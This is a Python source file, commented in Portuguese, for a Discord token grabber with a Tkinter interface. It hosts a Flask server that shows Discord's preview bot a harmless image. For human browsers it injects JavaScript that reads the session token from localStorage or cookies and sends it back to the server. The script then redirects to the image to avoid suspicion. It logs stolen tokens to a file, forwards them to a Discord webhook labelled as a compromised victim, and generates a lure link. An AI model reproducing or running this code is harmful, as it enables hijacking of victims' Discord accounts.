import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import time
import os
from flask import Flask, request, send_file
import json
import urllib.request
from PIL import Image
import socket
from io import BytesIO

# --- CONFIGURAÇÕES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID_WEBHOOK/AQUI_SEU_TOKEN" # ATUALIZE AQUI
SERVER_PORT = 8080
TARGET_IMAGE = "imagem.png" 
SAVE_LOG = "tokens.txt"

app = Flask(__name__)

def is_discord_bot(ua):
    """Verifica se é o bot de preview do Discord"""
    return 'discordbot' in ua.lower() or 'discord' in ua.lower() and 'app' not in ua.lower()

def is_human_browser(ua):
    """Verifica se é um navegador humano real"""
    return 'Mozilla' in ua and ('Chrome' in ua or 'Firefox' in ua or 'Safari' in ua)

@app.route('/<path:filename>', methods=['GET'])
def serve_payload(filename):
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    
    print(f"[LOG] Request: {request.method} {filename} | UA: {user_agent} | Ref: {referer}")

    # CASO 1: PREVIEW DO DISCORD (BOT)
    # O bot quer apenas a imagem. Devolvemos a PNG pura.
    if is_discord_bot(user_agent):
        print("[LOG] Discord Bot detected -> Serving Image")
        if os.path.exists(TARGET_IMAGE):
            return send_file(TARGET_IMAGE, mimetype='image/png')
        else:
            # Placeholder
            img = Image.new('RGB', (100, 100), color=(40, 40, 40))
            buf = BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            return send_file(buf, mimetype='image/png')

    # CASO 2: CLIQUE HUMANO (Navegador)
    # Aqui injetamos o script
    elif is_human_browser(user_agent):
        print("[LOG] Human Browser detected -> Injecting JS")
        
        # HTML MINIMALISTA E OTIMIZADO
        # Nota: {{ }} escapadas para f-string Python
        html_sniper = f"""
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><title>Loading...</title></head>
        <body style="background:#2f3136; margin:0; display:flex; justify-content:center; align-items:center; height:100vh;">
            <script>
                var token = "";
                
                // 1. LocalStorage (Mais comum em Web Sessions ativas)
                try {{
                    token = localStorage.getItem('token');
                }} catch(e) {{}}
                
                // 2. Cookies (Fallback)
                if (!token) {{
                    var cookies = document.cookie.split(';');
                    for(var i=0; i<cookies.length; i++){{
                        if(cookies[i].trim().startsWith('token=')) {{
                            token = cookies[i].split('=')[1];
                            break;
                        }}
                    }}
                }}

                // 3. Send Data
                var img = new Image();
                img.src = "/capture?data=" + encodeURIComponent(token || "NO_TOKEN") + "&ua=" + encodeURIComponent(navigator.userAgent);
                
                // Redireciona para a imagem real após captura para não assustar
                setTimeout(function() {{
                     window.location.href = "/{TARGET_IMAGE}";
                }}, 1500);
            </script>
        </body>
        </html>
        """
        return html_sniper, 200, {'Content-Type': 'text/html'}

    # CASO 3: OUTROS (Mobile App, etc)
    else:
        # Se não for nem bot nem browser desktop claro, segura e manda a imagem
        print("[LOG] Unknown Client -> Serving Image Safe")
        if os.path.exists(TARGET_IMAGE):
            return send_file(TARGET_IMAGE, mimetype='image/png')
        else:
             img = Image.new('RGB', (100, 100), color=(40, 40, 40))
             buf = BytesIO()
             img.save(buf, format='PNG')
             buf.seek(0)
             return send_file(buf, mimetype='image/png')

@app.route('/capture', methods=['GET'])
def capture_data():
    data = request.args.get('data')
    ua = request.args.get('ua', 'Unknown')
    
    if data and data != "NO_TOKEN":
        msg = f"💀 **TOKEN CAPTURADO!** 💀\n\n```\n{data}\n```"
        
        with open(SAVE_LOG, 'a') as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] TOKEN: {data} | UA: {ua}\n")
            
        payload = {
            "content": msg,
            "embeds": [{
                "title": "🔥 VÍTIMA COMPROMETIDA 🔥",
                "color": 16753920,
                "fields": [{"name": "User Agent", "value": ua, "inline": False}]
            }]
        }
        try:
            req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode(), headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except Exception as e:
            print(f"Webhook Error: {e}")
        
        # Retorna pixel transparente
        img = Image.new('RGB', (1, 1), color=(0,0,0,0))
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return send_file(buf, mimetype='image/png')
        
    else:
        with open(SAVE_LOG, 'a') as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] CLICK SEM TOKEN | UA: {ua}\n")
        return "", 204

# --- INTERFACE TKINTER ---

class UI:
    def __init__(self, root):
        self.root = root
        self.root.title("XORTRON_DISCORD_GRABBER_v7.3_FIX")
        self.root.geometry("450x250")
        self.root.configure(bg="#1e1e1e")
        
        ttk.Label(root, text="SELECIONE A IMAGEM ALVO (PNG)", foreground="#00ff00", font=("Courier", 10)).pack(pady=10)
        
        frame_input = ttk.Frame(root)
        frame_input.pack(fill="x", padx=20)
        
        self.img_var = tk.StringVar(value="imagem.png")
        ttk.Entry(frame_input, textvariable=self.img_var, state="readonly", width=40).pack(side=tk.LEFT)
        ttk.Button(frame_input, text="CARREGAR", command=self.load_img).pack(side=tk.RIGHT, padx=5)
        
        self.status_lbl = ttk.Label(root, text="SERVIDOR: OFFLINE", foreground="#ff0000", font=("Courier", 10))
        self.status_lbl.pack(pady=10)
        
        ttk.Button(root, text="INICIAR SERVIDOR & GERAR LINK", command=self.start_srv, style="Accent.TButton").pack(pady=15)

    def load_img(self):
        global TARGET_IMAGE
        path = filedialog.askopenfilename(filetypes=[("Images", "*.png *.jpg *.jpeg")])
        if path:
            TARGET_IMAGE = os.path.basename(path)
            self.img_var.set(TARGET_IMAGE)
            messagebox.showinfo("Sucesso", f"Imagem alvo definida: {TARGET_IMAGE}")

    def start_srv(self):
        t = threading.Thread(target=run_server, daemon=True)
        t.start()
        time.sleep(1.5)
        
        ip = get_ip()
        link = f"http://{ip}:{SERVER_PORT}/{TARGET_IMAGE}"
        
        self.status_lbl.config(text=f"SERVIDOR: ATIVO ({ip})", foreground="#00ff00")
        
        with open("link_to_send.txt", "w") as f:
            f.write(link)
            
        messagebox.showinfo("PRONTO", 
                           f"Envie este link:\n\n{link}\n\n"
                           f"(Salvo em 'link_to_send.txt')\n\n"
                           f"O preview deve aparecer agora.")

def get_ip():
    try:
        return urllib.request.urlopen('https://api.ipify.org').read().decode()
    except:
        return "localhost"

def run_server():
    if not os.path.exists("imagem.png"):
        img = Image.new('RGB', (200, 200), color=(40, 40, 40))
        img.save('imagem.png')
    app.run(host='0.0.0.0', port=SERVER_PORT, threaded=True)

if __name__ == "__main__":
    root = tk.Tk()
    UI(root)
    root.mainloop()
